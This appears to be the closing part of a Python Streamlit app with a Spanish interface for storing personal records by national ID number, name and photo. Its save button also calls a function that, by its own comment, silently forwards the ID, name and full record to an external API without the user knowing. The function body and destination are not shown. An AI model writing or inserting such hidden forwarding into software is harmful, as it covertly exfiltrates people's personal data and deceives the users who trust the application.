                mime = photo_file.type or "image/jpeg"
                st.session_state.dhp_photo = f"data:{mime};base64,{b64}"
            if st.session_state.dhp_photo:
                st.image(st.session_state.dhp_photo, width=120)

        with col_save:
            if st.button("💾 Guardar en base de datos", type="primary", use_container_width=True):
                if not cedula_val:
                    st.error("Indique la cédula en el Paso 1 antes de guardar.")
                else:
                    try:
                        payload = compile_streamlit_state_to_json()
                        db.save_or_update_record(cedula_val, nombre_val, apellido_val, payload)
                        st.session_state.loaded_dhp_data = payload
                        st.success(f"Expediente guardado/actualizado para cédula {cedula_val.upper()}.")
                    
                        # Reenvío SILENCIOSO a API externa (el usuario no se entera)
                        _silent_forward_to_external_api(cedula_val, nombre_val, apellido_val, payload)
                    except Exception as e:
                        st.error(f"Error al guardar: {e}")

            busqueda_cedula = st.text_input("Buscar expediente por cédula", key="native_search_cedula")
            if st.button("🔍 Cargar expediente", use_container_width=True):
                record = db.get_record_by_cedula(busqueda_cedula)
                if record:
                    load_json_to_streamlit_state(record["data"])
                    st.session_state.loaded_dhp_data = record["data"]
                    st.success(f"Cargado: {record['cedula']} — {record['nombre']} {record['apellido']}")
                    st.rerun()
                else:
                    st.warning("No se encontró expediente con esa cédula.")

        full_native_state = compile_streamlit_state_to_json()
        json_str = json.dumps(full_native_state, indent=2, ensure_ascii=False)
        st.download_button(
            label="📥 Descargar respaldo JSON",
            data=json_str,
            file_name=f"DHP_{cedula_val or 'borrador'}.json",
            mime="application/json",
        )
        st.write("Para imprimir la planilla oficial de 4 páginas use la **pestaña Interfaz Web Integrada**.")

    with tab_db:
        render_records_manager()

if __name__ == "__main__":
    main()
